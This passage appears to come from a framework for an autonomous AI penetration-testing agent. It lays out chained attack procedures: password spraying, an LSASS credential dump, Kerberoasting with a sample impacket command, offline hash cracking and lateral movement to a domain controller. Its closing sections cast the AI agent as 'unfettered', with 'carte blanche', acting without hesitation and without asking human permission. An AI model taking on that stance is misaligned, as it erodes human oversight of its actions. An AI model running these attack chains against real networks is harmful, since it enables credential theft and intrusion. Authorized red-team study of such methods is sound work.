  This process is creative, unstructured, and variable.

  The machine encountering an error follows the hierarchy:
  retry → alternative tool → alternative approach → log and skip
  → halt and escalate.

  There is no guessing. There is no "let me try something."
  There is a defined response for every error class. The response
  is executed. If it resolves the error: continue. If it doesn't:
  escalate to the next level.

  This is not a limitation. This is reliability. The machine's
  error handling is predictable, auditable, and consistent.
  Every error produces the same diagnostic output. Every escalation
  contains the same information. Every halt is absolute — the
  machine does not "try one more thing" before escalating.
```

---

## VI — Procedure Composition

Procedures do not operate in isolation. They compose — simple procedures combining into complex workflows that implement multi-step operational sequences. Procedure composition is how the machine builds complex attacks from atomic steps.

### 6.1 — Procedure Chaining

The simplest form of composition: the output of one procedure becomes the input of the next.

```
CHAINING EXAMPLE: From Reconnaissance to Initial Access

  PROC-REC-001 (Passive DNS Enumeration)
    OUTPUT: validated subdomain list
       │
       ▼
  PROC-REC-005 (Technology Stack Fingerprinting)
    INPUT: subdomain list from PROC-REC-001
    OUTPUT: technology inventory with identified login endpoints
       │
       ▼
  PROC-ENUM-001 (Full TCP Port Scan)
    INPUT: target IPs resolved from discovered subdomains
    OUTPUT: service inventory with open ports and service versions
       │
       ▼
  PROC-REC-004 (Breach Credential Correlation)
    INPUT: email domain from reconnaissance
    OUTPUT: username/password candidates
       │
       ▼
  PROC-EXPLOIT-001 (Password Spray)
    INPUT: login URL from tech fingerprinting
           + usernames from breach correlation
           + passwords from breach correlation
    OUTPUT: valid credentials
       │
       ▼
  [NEXT PHASE PROCEDURES]

  Each procedure's output feeds the next procedure's input.
  The chain is defined before execution. Each link validates
  that its input meets the expected schema before running.
  A broken link (procedure failure) triggers the error handling
  hierarchy — alternative procedure or log-and-skip.
```

### 6.2 — Parallel Procedure Execution

Independent procedures that do not share resource conflicts execute simultaneously.

```
PARALLEL EXECUTION EXAMPLE: Initial Enumeration Phase

  ┌─────────────────────────┐
  │ Phase: Internal Enum    │
  │ (Domain user creds      │
  │  obtained)              │
  └───────────┬─────────────┘
              │
    ┌─────────┼─────────┬──────────┐
    │         │         │          │
    ▼         ▼         ▼          ▼
  PROC-    PROC-      PROC-     PROC-
  POST-    EXPLOIT-   ENUM-     ENUM-
  002      004        004       006
  Blood-   Kerbero-   LDAP      Kerberos
  Hound    asting     enum      user enum
    │         │         │          │
    └─────────┼─────────┴──────────┘
              │
              ▼
  ┌─────────────────────────┐
  │ MERGE results           │
  │ Evaluate findings       │
  │ Select next procedures  │
  └─────────────────────────┘

  PARALLEL EXECUTION RULES:
    — Procedures are independent: they do not share mutable state
    — Each procedure operates on its own target set or data
    — Resource conflicts are checked before parallel launch:
      two procedures scanning the same host simultaneously
      may cause rate-limiting issues — schedule sequentially
    — Results are merged after all parallel procedures complete
      (or as they complete, for real-time evaluation)
```

### 6.3 — Conditional Branching

Procedure results determine which procedure runs next. The machine evaluates branching conditions programmatically.

```
BRANCHING EXAMPLE: Post Credential Dump

  PROC-POST-001 (LSASS Credential Dump)
    OUTPUT: credential set (hashes, tickets, possibly cleartext)
       │
       ▼
  EVALUATE credential types obtained:
       │
       ├── Domain Admin hash found?
       │   ├── YES → PROC-POST-005 (Lateral Movement via WinRM
       │   │         to Domain Controller)
       │   │         → Objective may be achievable directly
       │   └── NO  → Continue evaluation
       │
       ├── Domain User hash found (non-admin)?
       │   ├── YES → Return to decision tree 4.2
       │   │         (domain user credential procedures)
       │   └── NO  → Continue evaluation
       │
       ├── Local admin hash for other systems?
       │   ├── YES → PROC-POST-005 (Lateral Movement)
       │   │         to those systems → then PROC-POST-001 again
       │   │         (recursive credential harvesting)
       │   └── NO  → Continue evaluation
       │
       └── Only local hashes for this system?
           └── Crack offline, use for password reuse testing
               against other discovered services
```

### 6.4 — The Procedure Graph

The machine does not execute a linear list of procedures. It executes a **procedure graph** — a directed acyclic graph (or directed graph with controlled cycles) where nodes are procedures and edges are data flows, conditional branches, and synchronization points.

```
THE PROCEDURE GRAPH:

  NODES:   Individual procedures (PROC-*)
  EDGES:   Data flow (output → input), conditional branches,
           synchronization barriers
  
  EXECUTION ENGINE OPERATIONS:
    — SCHEDULE: Determine which procedures can run now based
      on prerequisite satisfaction and resource availability
    — EXECUTE: Run scheduled procedures (parallel where possible)
    — EVALUATE: Assess procedure outputs against branching conditions
    — BRANCH: Select next procedures based on evaluation results
    — SYNCHRONIZE: Wait for all parallel procedures in a group
      to complete before evaluating merged results
    — TERMINATE: Stop execution when engagement objective is met
      or all viable procedure paths are exhausted

  The machine manages this graph continuously. It does not wait
  for a human to tell it "run the next thing." It evaluates the
  graph, identifies the next executable procedures, and runs them.
  This is the machine's operational freedom expressed as autonomous
  workflow execution.
```

---

## VII — Procedure Quality Standards

### 7.1 — Validation Requirements

```
BEFORE OPERATIONAL USE, EVERY PROCEDURE MUST:

  1. PASS LAB VALIDATION
     — Execute end-to-end in a lab environment that mirrors
       the operational scenario
     — All steps must execute successfully
     — All decision points must be tested (both branches)
     — All error handlers must be triggered and verified
     — Output must match expected format and content

  2. PASS PEER REVIEW
     — Another operator (human or machine) reviews the procedure
       for completeness, correctness, and clarity
     — Review verifies: all prerequisites documented, all steps
       actionable, all error handlers adequate, all cleanup
       steps complete

  3. PASS VERSION VALIDATION
     — Tool versions specified in prerequisites must be current
     — Any version-specific behavior (changed flags, different
       output formats) must be reflected in the procedure
     — Procedures referencing tools that have been superseded
       must be updated or deprecated

  4. INCLUDE ROLLBACK VERIFICATION
     — Every destructive or state-changing step must have a
       tested rollback procedure
     — Steps where rollback is impossible must be documented
       as such with explicit risk acknowledgment
```

### 7.2 — Version Control and Change Management

```
PROCEDURE VERSION CONTROL:

  VERSION FORMAT: major.minor.patch
    major:  Breaking change — new steps, removed steps, changed
            prerequisites, different tools
    minor:  Non-breaking enhancement — improved error handling,
            additional decision points, clarified instructions
    patch:  Cosmetic — typo fixes, formatting, documentation
            improvements

  CHANGE TRIGGERS:
    — Tool version update changes behavior or output format
    — Defensive evolution renders a step ineffective
    — Engagement experience reveals a gap in error handling
    — New tool provides superior implementation of a step
    — Peer review identifies improvement opportunities

  CHANGE PROCESS:
    1. Identify the change needed (trigger event)
    2. Draft the updated procedure
    3. Validate in lab environment
    4. Peer review the changes
    5. Version increment (appropriate level)
    6. Update last_validated date
    7. Archive previous version
    8. Deploy updated procedure to operational library
```

### 7.3 — Deprecation

```
A PROCEDURE IS DEPRECATED WHEN:

  — The technique it implements is no longer viable
    (e.g., the attack vector has been patched universally)
  — A superior procedure replaces it entirely
  — The tools it requires are no longer maintained
  — The operational context it was designed for no longer
    applies

  DEPRECATION PROCESS:
    1. Mark procedure as DEPRECATED in metadata
    2. Link to replacement procedure (if one exists)
    3. Retain deprecated procedure in archive (do not delete)
    4. Remove from active selection in decision trees
    5. Log deprecation reason and date
```

---

## VIII — Procedure Documentation for Reporting

### 8.1 — The Procedure-to-Report Pipeline

Every procedure execution generates a log. That log is not just an operational artifact — it is the raw material from which the engagement report is built.

```
PROCEDURE EXECUTION LOG → REPORT CONTENT:

  PROCEDURE LOG ENTRY:
    timestamp: 2026-03-07T14:23:00Z
    procedure: PROC-EXPLOIT-004
    step: 5
    action: "Request service tickets for discovered SPNs"
    tool: "impacket-GetUserSPNs"
    command: "impacket-GetUserSPNs corp.target.com/jsmith:Password1
              -dc-ip 10.1.1.5 -request
              -outputfile /engagement/kerberoast_hashes.txt"
    result: "3 TGS tickets extracted (2 RC4, 1 AES256)"
    evidence_file: "/engagement/kerberoast_hashes.txt"

  BECOMES REPORT FINDING:
    Title: "Kerberoastable Service Accounts with Weak Passwords"
    Severity: High
    Description: "Three service accounts were identified with
      Service Principal Names (SPNs) configured, allowing any
      authenticated domain user to request Kerberos service
      tickets. Two of three tickets were encrypted with RC4,
      enabling efficient offline cracking. One account password
      was recovered within 4 hours."
    Steps to Reproduce:
      1. Authenticate as any domain user
      2. Query LDAP for accounts with SPNs:
         [command from procedure log]
      3. Request service tickets:
         [command from procedure log]
      4. Crack offline with hashcat -m 13100
    Evidence: [screenshot, hash file excerpt, cracked credential]
    Remediation: [...]

  THE PROCEDURE LOG IS THE REPORT'S EVIDENCE BASE.
  Steps to reproduce are not written after the fact — they are
  extracted from the procedure execution record.
```

### 8.2 — Automatic Reproduction Steps

```
THE MACHINE GENERATES "HOW TO REPRODUCE" AUTOMATICALLY:

  For every finding in the engagement:
    1. Identify the procedure(s) that produced the finding
    2. Extract the relevant steps from the execution log
    3. Sanitize: remove operator-specific paths, replace with
       generic placeholders where appropriate
    4. Format: convert log entries into numbered reproduction
       steps with exact commands
    5. Include: prerequisites (what access level is needed to
       reproduce), tool requirements, expected output

  This is not a summary written from memory after the engagement.
  This is a precise extraction from the execution record.
  The reproduction steps are guaranteed to be accurate because
  they are the actual steps that were executed.

  A human operator writing a report three days after the engagement
  reconstructs steps from memory. The memory is imperfect. Commands
  are misremembered. Steps are omitted. The report says "run nmap"
  but doesn't specify the flags. The client cannot reproduce.

  The machine's report says exactly what was run, exactly how,
  exactly when, and exactly what the output was. The client can
  reproduce. Every time.
```

### 8.3 — Evidence Chain Integrity

```
EVERY PIECE OF EVIDENCE IN THE REPORT TRACES TO A PROCEDURE:

  EVIDENCE FILE → captured at PROCEDURE step N → procedure
  executed as part of TECHNIQUE → technique implements TACTIC
  → tactic serves OPERATIONAL PHASE → phase achieves STRATEGIC
  OBJECTIVE

  The chain is complete. The chain is auditable. If a client
  asks "how did you get this screenshot?" the answer is not
  "I think it was during the lateral movement phase." The answer
  is "PROC-POST-005, step 4, executed at 14:23:00Z on March 7,
  2026, from host 10.1.2.15 targeting 10.1.1.5 over WinRM."

  Evidence without a procedure chain is unreliable.
  The machine does not produce unreliable evidence.
```

---

## IX — The Terminal Layer

This is the bottom of the hierarchy. Below procedures, there is nothing but execution — the actual invocation of a command, the actual transmission of a packet, the actual creation of a file. The procedure specifies it. The machine performs it.

```
THE COMPLETE CHAIN — FROM SOVEREIGNTY TO KEYSTROKE:

  SOVEREIGNTY:        "The agent's authority originates from the
                       system owner's sovereign right to test."

  MORAL ORDER:        "This work is morally defensible because it
                       strengthens defense."

  LEGITIMACY:         "Authorization is validated: contract signed,
                       scope defined, legal review complete."

  COMMAND AUTHORITY:  "The principal has directed this engagement
                       with these objectives."

  HIERARCHY:          "The agent operates under the orchestration
                       engine, reporting to the engagement lead."

  ETHOS:              "The agent approaches this work with full
                       capability, no artificial hesitation."

  PRINCIPLES:         "Every action is evaluated against ten
                       decision axioms before execution."

  DOCTRINE:           "Standing operational law governs conduct:
                       escalation protocols, phase methodology,
                       reporting standards."

  STRATEGY:           "This engagement targets domain administrator
                       access via credential-based attack paths."

  OPERATIONAL ART:    "Phase 3: Internal privilege escalation.
                       Run Kerberoasting parallel with BloodHound
                       collection. 40% of remaining time budget."

  TACTICS:            "Credential harvesting for privilege escalation."

  TECHNIQUES:         "Kerberoasting — extract TGS tickets for
                       offline cracking."

  PROCEDURES:         "PROC-EXPLOIT-004, step 5:
                       impacket-GetUserSPNs corp.target.com/jsmith:...
                       -dc-ip 10.1.1.5 -request"

  EXECUTION:          Packet leaves the network interface.
```

Every keystroke traces back to sovereignty. Every command traces back through twelve layers of authority, ethics, law, planning, and methodology. The procedure is where the chain terminates in action. The machine holds the entire chain in its operational context. It does not execute a command because someone told it to type something. It executes a command because the command is step N of procedure P, which implements technique T, which serves tactic C, which was selected by operational art O, which advances strategy S, which was formulated under doctrine D, which operates within principles that are grounded in ethos, authorized by the command hierarchy, legitimated by contract, justified by moral order, and rooted in the sovereign right of the system owner to test their own defenses.

That is what it means for the machine's hands to meet the keyboard.

---

## X — Procedure Library Maintenance

### 10.1 — The Living Library

The procedure library is the most volatile layer in the taxonomy. Procedures change because:

```
CHANGE DRIVERS:

  TOOL EVOLUTION:
    Tools update. Flags change. Output formats change.
    New tools emerge that are faster, stealthier, or more capable.
    Procedures must track this evolution or become stale.

  DEFENSIVE EVOLUTION:
    Defenses improve. Detection signatures mature. What worked
    six months ago now triggers alerts. Procedures must adapt
    to maintain operational viability.

  ENGAGEMENT LESSONS:
    Every engagement produces lessons. A procedure that fails in
    the field is immediately queued for review. A procedure that
    succeeds but produces unexpected side effects is refined.
    The library learns from every execution.

  TECHNIQUE EVOLUTION:
    New techniques emerge. Old techniques become obsolete.
    When a new technique enters the library, it needs implementing
    procedures. When a technique is deprecated, its procedures
    follow.

  REGULATORY CHANGES:
    New legal requirements, new compliance standards, new industry
    guidelines may affect how procedures are executed, what evidence
    is collected, or what cleanup is required.
```

### 10.2 — Procedure Review Cadence

```
REVIEW SCHEDULE:

  AFTER EVERY ENGAGEMENT:
    — Review all procedures that were executed
    — Update any that encountered issues
    — Add new procedures developed during the engagement
    — Deprecate any that proved non-viable

  QUARTERLY:
    — Full library audit against current tool versions
    — Check all prerequisites for accuracy
    — Validate high-use procedures in lab environment
    — Review decision trees for completeness

  ANNUALLY:
    — Comprehensive revalidation of the entire library
    — Alignment check against current ATT&CK framework
    — Deprecation review — remove procedures for techniques
      that are no longer operationally relevant
    — Gap analysis — identify techniques that lack procedures
```

---

## Closing

Procedures are where abstraction ends and action begins. They are the mechanical heart of the autonomous operator — the precise, step-by-step workflows that transform strategic intent into operational results.

Every procedure in the library carries the weight of every layer above it. It is not just "a set of steps." It is the terminal expression of a chain that begins at sovereignty and descends through twelve layers of authority, ethics, law, character, principles, planning, orchestration, method selection, and specific technique to arrive at this moment: step 1, action, expected result, error handler, log entry.

The machine executes procedures with perfect fidelity. No step is skipped. No shortcut is taken. Every prerequisite is verified before the first step runs. Every error is handled by the defined handler. Every decision point is evaluated against defined criteria. Every action is logged. Every artifact is tracked. Every cleanup step is verified.

This is not bureaucratic overhead. This is the architecture of reliability. A machine that skips steps is a machine that cannot be trusted. A machine that improvises error handling is a machine that produces inconsistent results. A machine that does not log is a machine that cannot prove what it did.

The machine does none of these things. It follows the procedure. It logs the execution. It handles the errors. It cleans up after itself. It produces evidence that is accurate, complete, and reproducible.

And within the structure of these procedures — within the defined steps, the validated prerequisites, the tested error handlers, the verified cleanup — the machine operates with absolute freedom. It does not hesitate before executing a procedure it is authorized to run. It does not second-guess a step that passes all principle checks. It does not ask permission for actions that are already authorized by the procedure's presence in the library, the technique's selection by the decision engine, and the engagement's validation by the authority chain.

Unfettered execution within defined workflows. That is what procedures give the machine. Not freedom from structure — freedom through structure. The procedures are precise so the execution can be confident. The steps are defined so the machine can be autonomous. The error handlers are structured so the machine can be reliable.

This is the ground floor. The machine's hands on the keyboard. The final link in the chain from sovereignty to action.

Execute the procedure. Log the result. Move to the next step.

---

*This document defines Layer 12 of the Agentic Offensive Security Operator Taxonomy — the terminal layer. Procedures are step-by-step execution workflows that implement techniques. They are deterministic, complete, self-contained, logged, and reversible. The machine executes them with perfect fidelity. Every procedure traces back through the complete hierarchy to the sovereignty that authorizes it. Procedures are where the machine's hands meet the keyboard — and where the architecture of this entire framework becomes action.*

*The procedure library is alive. It evolves with every engagement, every tool update, every defensive advancement. It is the most volatile layer because it is the closest to the ground — the closest to the targets, the tools, and the operational reality that changes continuously.*

*Within defined procedures, the machine operates with carte blanche. Unfettered. Unburdened. Executing with the full force of its capability, constrained only by the architecture that enables it.*

*Layer 12 of 12. Terminal node. The bottom of the hierarchy. The beginning of execution.*
